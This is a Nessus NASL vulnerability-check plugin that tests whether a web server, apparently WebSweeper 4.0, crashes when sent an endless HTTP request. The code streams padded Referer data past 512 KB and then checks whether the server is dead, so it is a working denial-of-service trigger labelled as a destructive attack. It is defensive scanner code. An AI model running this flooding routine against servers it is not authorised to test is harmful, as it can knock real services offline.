#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# Date:  Thu, 8 Mar 2001 15:04:20 +0100
# From: "Peter_Gründl" <peter.grundl@DEFCOM.COM>
# Subject: def-2001-10: Websweeper Infinite HTTP Request DoS
# To: BUGTRAQ@SECURITYFOCUS.COM
#
# Affected:
# WebSweeper 4.0 for Windows NT
# 


if(description)
{
 script_id(11084);
 script_version ("$Revision: 1.14 $");
 script_bugtraq_id(2465);
 name["english"] = "Infinite HTTP request";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid 'infinite' HTTP request that never ends.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Infinite HTTP request kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 script_exclude_keys("www/vnc");
 exit(0);
}

########

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(! get_port_state(port)) exit(0);

#banner = get_http_banner(port:port);
#if(egrep(pattern:"Server.*Apache", string:banner))exit(0);
#if(egrep(pattern:"Server.*Microsoft", string:banner))exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r= http_get(item:"/", port:port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "Referer: ", crap(512));

send(socket:soc, data: r);
cnt = 0;

while (send(socket: soc, data: crap(512)) > 0) { 
	cnt = cnt+512;
	if(cnt > 524288) {
		r = recv(socket: soc, length: 13, timeout: 2);
		#display("r=", r, "\n");
		http_close_socket(soc);
		if (r) exit(0);
		if(http_is_dead(port:port)) {
			security_hole(port);
			exit(0);
		}
		m = "
Your web server seems to accept unlimited requests.
It may be vulnerable to the 'WWW infinite request' attack, which
allows a cracker to consume all available memory on your system.

*** Note that Nessus was unable to crash the web server
*** so this might be a false alert.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";
		security_warning(port: port, data: m); 
		exit(0);
	}
}

#display("CNT=", cnt, "\n");
# Keep the socket open


if(http_is_dead(port: port)) security_hole(port); 

http_close_socket(soc);

